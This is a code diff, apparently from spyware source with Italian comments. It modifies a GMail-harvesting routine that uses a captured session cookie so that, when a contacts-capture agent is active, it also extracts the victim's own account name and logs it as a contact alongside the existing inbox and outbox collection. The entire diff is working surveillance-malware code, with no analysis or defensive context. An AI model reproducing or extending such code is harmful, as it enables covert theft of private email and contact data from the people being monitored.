@@ -17,8 +17,10 @@
 extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
 extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
 extern WCHAR *UTF8_2_UTF16(char *str); // in firefox.cpp
+extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);
 
 extern BOOL bPM_MailCapStarted; // variabili per vedere se gli agenti interessati sono attivi
+extern BOOL bPM_ContactsStarted; 
 extern DWORD max_social_mail_len;
 
 DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi, DWORD last_tstamp_lo, BOOL is_incoming)
@@ -167,6 +169,7 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi,
 DWORD HandleGMail(char *cookie)
 {
 	DWORD ret_val;
+	HANDLE hfile;
 	BYTE *r_buffer = NULL;
 	DWORD response_len;
 	WCHAR mail_request[256];
@@ -176,7 +179,7 @@ DWORD HandleGMail(char *cookie)
 
 	CheckProcessStatus();
 
-	if (!bPM_MailCapStarted)
+	if (!bPM_MailCapStarted && !bPM_ContactsStarted)
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 
 	// Verifica il cookie 
@@ -201,10 +204,28 @@ DWORD HandleGMail(char *cookie)
 	FREE_PARSING(ptr2);
 	*ptr2 = 0;
 	_snprintf_s(ik_val, sizeof(ik_val), _TRUNCATE, "%s", ptr);	
+
+	// Cattura il proprio account
+	if (bPM_ContactsStarted) {
+		ptr = ptr2 + 1;
+		ptr = strchr(ptr, '\"');
+		FREE_PARSING(ptr);
+		ptr++;
+		ptr2 = strchr(ptr, '\"');
+		FREE_PARSING(ptr2);
+		*ptr2 = 0;
+	
+		hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
+		_snwprintf_s(mail_request, sizeof(mail_request)/sizeof(WCHAR), _TRUNCATE, L"%S", ptr);		
+		DumpContact(hfile, CONTACT_SRC_GMAIL, mail_request, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONTACTS_MYACCOUNT);
+		Log_CloseFile(hfile);
+	}
+
 	SAFE_FREE(r_buffer);
+	if (!bPM_MailCapStarted)
+		return SOCIAL_REQUEST_SUCCESS;
 
 	last_tstamp_lo = GetLastFBTstamp(ik_val, &last_tstamp_hi);
-
 	ParseMailBox(GM_OUTBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, FALSE);
 	return ParseMailBox(GM_INBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, TRUE);
 }
